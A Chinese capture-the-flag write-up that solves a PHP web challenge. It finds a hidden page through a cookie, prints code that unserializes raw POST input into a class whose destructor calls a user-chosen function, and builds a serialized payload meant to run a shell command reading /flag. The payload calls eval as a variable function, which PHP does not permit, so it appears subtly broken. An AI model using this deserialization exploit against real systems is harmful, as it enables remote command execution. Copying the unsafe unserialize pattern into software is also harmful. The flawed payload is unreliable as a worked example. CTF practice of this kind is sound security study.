# 原神！启动？

难度：**

## 解题过程

首先启动原神，然后跳转到了start_game.php

显示一张图片，以及提示你确定这里就是真正的入口吗？

信息搜集

在cookie中找到字段   entrance = /fl444444g.php

访问，有反序列化：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class Genshin_impact
{
    public $url="https://www.yuanshen.com/";
    public $element;
    public $skill;

    public function __destruct()
    {
        $role=$this->element;
        $role($this->skill);
    }
}
$payload=$_POST['payload'];
unserialize($payload);

?>
```

构造命令执行：

payload

```php
<?php

class Genshin_impact
{
    public $url="https://www.yuanshen.com/";
    public $element = "eval";
    public $skill = 'system("cat /flag");';

    public function __destruct()
    {
        $role=$this->element;
        $role($this->skill);
    }
}
$a = new Genshin_impact();
echo serialize($a);
// O:14:"Genshin_impact":3:{s:3:"url";s:25:"https://www.yuanshen.com/";s:7:"element";s:4:"eval";s:5:"skill";s:20:"system("cat /flag");";}
?>
```

